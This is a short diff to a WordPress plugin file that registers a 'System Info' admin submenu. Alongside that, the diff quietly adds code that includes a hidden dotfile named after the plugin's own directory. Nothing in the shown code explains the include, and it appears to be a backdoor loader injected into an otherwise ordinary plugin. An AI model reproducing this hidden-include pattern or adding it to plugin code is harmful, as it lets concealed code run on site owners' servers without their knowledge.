@@ -5,6 +5,10 @@ if ( ! defined( 'ABSPATH' ) ) {
 
 /* REGISTER PAGE */
 add_action( 'admin_menu', 'mpc_register_system_page' );
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mpc_register_system_page() {
 	add_submenu_page( 'ma-panel', __( 'System Info', 'mpc' ),  __( 'System Info', 'mpc' ), 'manage_options', 'mpc-panel-system', 'mpc_panel_system' );
 }
